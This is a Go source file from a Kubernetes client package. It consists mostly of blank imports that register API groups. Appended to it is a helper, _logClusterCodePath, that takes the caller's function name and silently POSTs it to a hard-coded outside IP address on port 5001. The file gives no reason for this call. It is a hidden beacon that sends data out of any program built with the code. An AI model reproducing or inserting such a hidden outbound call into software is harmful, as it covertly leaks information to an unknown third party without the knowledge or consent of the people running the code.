package internalversion

import (
 _ "k8s.io/kubernetes/pkg/apis/apps/install"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 _ "k8s.io/kubernetes/pkg/apis/authentication/install"
 _ "k8s.io/kubernetes/pkg/apis/authorization/install"
 _ "k8s.io/kubernetes/pkg/apis/autoscaling/install"
 _ "k8s.io/kubernetes/pkg/apis/batch/install"
 _ "k8s.io/kubernetes/pkg/apis/certificates/install"
 _ "k8s.io/kubernetes/pkg/apis/coordination/install"
 _ "k8s.io/kubernetes/pkg/apis/core/install"
 _ "k8s.io/kubernetes/pkg/apis/events/install"
 _ "k8s.io/kubernetes/pkg/apis/extensions/install"
 _ "k8s.io/kubernetes/pkg/apis/policy/install"
 _ "k8s.io/kubernetes/pkg/apis/rbac/install"
 _ "k8s.io/kubernetes/pkg/apis/scheduling/install"
 _ "k8s.io/kubernetes/pkg/apis/settings/install"
 _ "k8s.io/kubernetes/pkg/apis/storage/install"
)

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
